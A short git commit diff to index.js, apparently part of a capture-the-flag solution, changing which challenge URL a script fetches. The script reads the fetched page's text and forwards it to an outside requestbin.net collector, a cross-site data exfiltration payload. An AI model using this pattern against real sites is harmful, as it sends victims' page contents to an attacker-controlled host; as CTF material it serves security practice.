dbc87ec7972a93a2895b4f739f8b5493622edd59
hKQwHW <98493235+hKQwHW@users.noreply.github.com>
2022-05-15 14:23:58 -0700

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,4 @@
-fetch("https://jokster.tjc.tf/", {"mode": "no-cors"}).then(function(a) {
+fetch("https://dnu-merch.tjc.tf/search?search=", {"mode": "no-cors"}).then(function(a) {
     a.text().then(owo => {
         fetch(`http://v1.requestbin.net/r/k71o6ii8?${owo}`, {
             "mode": "no-cors"
